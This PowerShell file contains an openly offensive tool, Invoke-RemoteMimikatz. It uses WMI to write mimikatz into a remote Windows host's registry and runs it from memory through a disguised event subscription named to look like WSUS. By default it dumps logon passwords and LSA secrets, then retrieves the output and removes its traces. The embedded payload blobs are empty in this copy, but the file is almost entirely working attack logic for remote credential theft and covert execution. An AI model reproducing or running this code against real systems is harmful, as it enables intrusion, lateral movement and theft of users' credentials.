function Invoke-RemoteMimikatz  {
    
    <#
    .SYNOPSIS
    This function is used to install a remote ActiveScriptEventConsumer with wmi and then reflectively load, and execute mimikatz.
    
    Author: Christopher Ross (@xorrior)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    This function will install a remote Wmi Event Sub with an ActiveScriptEventConsumer. The JScript consumer contains a csharp pe loader (by @subtee) and will load 
    mimikatz from memory. Mimikatz is written to the targets registry as a base64 encoded blob. The powershell_reflective_mimikatz export is executed and the results are written to a 'debug' registry key. The results are retrieved and then cleaned up.
    
    .PARAMETER ComputerName

    Host to target

    .PARAMETER Credential

    PSCredential object to pass to the Wmi functions

    .PARAMETER FilterName

    Name for the Event Filter

    .PARAMETER ConsumerName

    Name for the Consumer

    .PARAMETER Command

    Mimikatz command to run. Defaults to logonpasswords.

    .PARAMETER RegistryKey

    Path in the Registry to create/write the debug value. Paths within HKLM root only.

    .PARAMETER Timeout

    Amount of time to wait before retrieving the result from the registry.

    .EXAMPLE

    Execute the logonpasswords command on a remote host.

    Invoke-RemoteMimikatz -ComputerName 'BobsComputer.bobshouse.local' -Timeout 12 -Verbose

    .EXAMPLE

    Execute the lsadump::secrets command against remote host, with credentials

    Invoke-RemoteMimikatz -ComputerName 'Billy.bobshouse.local' -Credential $Credential -Command "token::elevate lsadump::secrets" -Verbose

    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        $Credential,

        [parameter(Mandatory=$False)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WSUSFilter',

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WSUSConsumer',

        [parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Command = "sekurlsa::logonpasswords",

        [parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryKey = "SOFTWARE\Microsoft\TechNet",

        [parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [int]$Timeout = 45 # I strongly recommend no less than 45 seconds.
    )

    $commonArgs = @{}
    $wmiArgs = @{}

    $commonArgs['ComputerName'] = $ComputerName

    if ($PSBoundParameters['Credential'] -ne $null) {
        $commonArgs['Credential'] = $Credential
    }

    Write-Verbose "[+] Executing command: $command on $ComputerName"
    Write-Verbose "[+] Obtaining target architecture"
    
    $targetOS = Get-WmiObject -Namespace root\cimv2 -Class Win32_OperatingSystem @commonArgs

    if ($targetOS.OSArchitecture -eq "64-bit") {
        $mimikatz = [Convert]::ToBase64String($mimikatz64)
        Write-Verbose "[+] 64-bit target"
    }
    else {
        $mimikatz = [Convert]::ToBase64String($mimikatz86)
        Write-Verbose "[+] 32-bit target"
    }

    #setup the event filter
    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryKey = $RegistryKey -replace '\\','\\'

    #Setup the registry keys for RemoteRecon C2
    $wmiArgs['Namespace'] = 'root\default'
    $wmiArgs['Class'] = 'StdRegProv'
    $wmiArgs['Name'] = "CreateKey"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryKey

    Write-Verbose "[+] Setting up registry key on $ComputerName"

    $result = Invoke-WmiMethod @wmiArgs @commonArgs -ErrorAction Stop

    if ($result.ReturnValue -ne 0) {
        Write-Warning "[!] Error setting up registry key for output"
        break
    }

    Write-Verbose "[+] Writing mimikatz PE to the registry"
    
    $wmiArgs['Name'] = 'SetStringValue'
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryKey,$mimikatz,"debug"
    $result = Invoke-WmiMethod @wmiArgs @commonArgs
    if($result.returnValue -ne 0) {
        Write-Warning "[!] Unable to set value for debug key. WMI return value: $($result.returnValue)"
        break
    }

     # set up a 30 second timer
     $TimerArg = @{
        IntervalBetweenEvents = ([UInt32] 30000)
        SkipIfPassed = $False
        TimerId = 'Timer'
    }
 
    $Arguments = @{
        Namespace = 'ROOT\cimv2'
        Class = '__IntervalTimerInstruction'
        Arguments = $TimerArg
    }

    Write-Verbose "[+] Creating the Timer event"
    $Timer = Set-WmiInstance @Arguments @commonArgs

    #Setup the Remote Wmi event subscription to trigger Execution
    $EventFilterArgs = @{
        EventNamespace = 'root\cimv2'
        Name = $FilterName
        Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'"
        QueryLanguage = "WQL"
    }

    #Install the filter
    
    Write-Verbose "[+] Installing the filter"
    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $EventFilterArgs @commonArgs -ErrorAction Stop
    
    $JScript = $JScript -replace 'REPLACE_COMMAND',$Command
    $JScript = $JScript -replace 'REPLACE_REGPATH',$RegistryKey

    $ActiveScriptEventConsumerArgs = @{
        Name = $ConsumerName
        ScriptingEngine = 'JScript'
        ScriptText = $JScript
        KillTimeout = [UInt32] 45
    }

    Write-Verbose "[+] Installing the ActiveScriptEventConsumer"
    
    $Consumer =  Set-WmiInstance -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" -Arguments $ActiveScriptEventConsumerArgs @commonArgs
    
   
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }

    #Setup the filter to consumer binding
    Write-Verbose "[+] Creating the FilterToConsumer binding"
    
    $FilterToConsumerBinding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $FilterToConsumerArgs @commonArgs
    
    Write-Verbose "Waiting $Timeout second/s to retrieve the results"
    
    Start-Sleep -Seconds $Timeout
    
    #Cleanup our event subscription
    Write-Verbose "[+] Cleaning up the subscription"
    Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction @commonArgs | ?{$_.TimerId -match 'Timer'} | Remove-WMIObject
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @commonArgs
    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @commonArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @commonArgs

    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject

    

    $wmiArgs['Name'] = "GetStringValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryKey,"debug"

    Write-Verbose "[+] Obtaining the result"
    $result = Invoke-WmiMethod @wmiArgs @commonArgs
    if ($result.ReturnValue -ne 0) {
        Write-Warning "[!] Unable to obtain output for mimikatz command. WMI returnValue: $($result.returnValue)"
        break
    }


    $resultstring = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))

    $returnObject = New-Object -TypeName PSObject
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Command' -Value $Command
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Result' -Value $resultstring

    $Arguments = @{
        Namespace = 'ROOT\cimv2'
        Class = 'Win32_Process'
        Filter = "name='scrcons.exe'"
    }

    $scrcons = Get-WmiObject @Arguments @commonArgs
    
    if ($scrcons) {
        Write-Verbose "[+] The scrcons process is still running. Killing...."
        $null = $scrcons.Terminate()
    }
    
    
    $wmiArgs['Name'] = 'SetStringValue'
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryKey,"","debug"
    $result = Invoke-WmiMethod @wmiArgs @commonArgs
    if($result.returnValue -ne 0) {
        Write-Warning "[!] Unable to set value for debug key. WMI return value: $($result.returnValue)"
    }
    

    $returnObject
}

#Base64 encoded powerkatz x86 or powerkatz x64
# https://github.com/gentilkiwi/mimikatz
# Compiled as of 11/23/2017

$EncodedCompressedFile64 = @'

'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile64),[IO.Compression.CompressionMode]::Decompress)
$mimikatz64 = New-Object Byte[](927232)
$DeflatedStream.Read($mimikatz64, 0, 927232) | Out-Null

$EncodedCompressedFile = @'

'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
